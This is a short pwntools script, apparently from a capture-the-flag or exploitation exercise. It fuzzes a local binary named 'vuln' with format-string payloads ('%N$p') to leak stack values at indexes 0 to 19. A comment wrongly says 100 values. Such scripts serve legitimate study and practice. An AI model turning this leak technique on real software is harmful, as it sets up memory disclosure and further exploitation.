from pwn import *

# Set binary context
elf = context.binary = ELF('./vuln', checksec=False)

# Adjust context
context.log_level = 'info'

# Let's fuzz 100 values
for i in range(20):
    try:
        # Start process
        p = process(level='error')
        
        # Send the input directly (no waiting for prompt)
        payload = '%{}$p'.format(i).encode()
        p.sendline(payload)
        
        # Receive response
        result = p.recv()
        
        # Print the result for the current index
        print(str(i) + ': ' + str(result))
        
        # Close the process
        p.close()
    except EOFError:
        pass
